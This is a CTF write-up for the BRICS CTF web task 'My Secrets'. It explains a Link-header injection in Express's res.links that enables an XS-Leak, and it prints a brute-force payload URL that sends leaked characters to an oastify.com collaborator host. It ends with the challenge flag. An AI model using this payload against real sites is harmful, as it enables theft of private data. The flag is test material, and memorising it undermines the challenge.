# web | My Secrets

## Information

> You can't get access to my secrets.
>
> https://mysecrets-8a88458a82b93f84.brics-ctf.ru
> https://mysecrets-8a88458a82b93f84.brics-ctf.ru/report

## Deploy

```sh
cd deploy
docker-compose -p my_secrets up --build -d
```


## Public

Provide zip file: [public/public.zip](public/public.zip).

## TLDR

XSLeak via 0day in express.

## Writeup

You can control res.links parametr by lang parametr

```
    res.links({preload: req.session.language?`/styles/${req.session.language}.css`:"/styles/russian.css"})
```

Check sources of express links:
```
res.links = function(links){
  var link = this.get('Link') || '';
  if (link) link += ', ';
  return this.set('Link', link + Object.keys(links).map(function(rel){
    return '<' + links[rel] + '>; rel="' + rel + '"';
  }).join(', '));
};
```
There is 0day vulnerability, you can pass '>' into links and preload your own file

If you check search route than you notice:
```
        res._headers={'Timing-Allow-Origin':'https://google.com'}
```
This will reset all other headers, including the link

Now just bruteforce symbols by open windows like
```
http://localhost:3000/posts/search?searchTerm={i&lang=>; rel="modulepreload",<https://guel4szie3107m73p61w4on1asgj49sy.oastify.com?e=bric>; rel="modulepreload",</a"
```

[Exploit](solve/exploit.html)

## Domain
`mysecrets-8a88458a82b93f84.brics-ctf.ru`

## Flag

`brics+{1_h0p3_y0u_f0und_my_task_1nter3st1ng}`

## Cloudflare
Yes
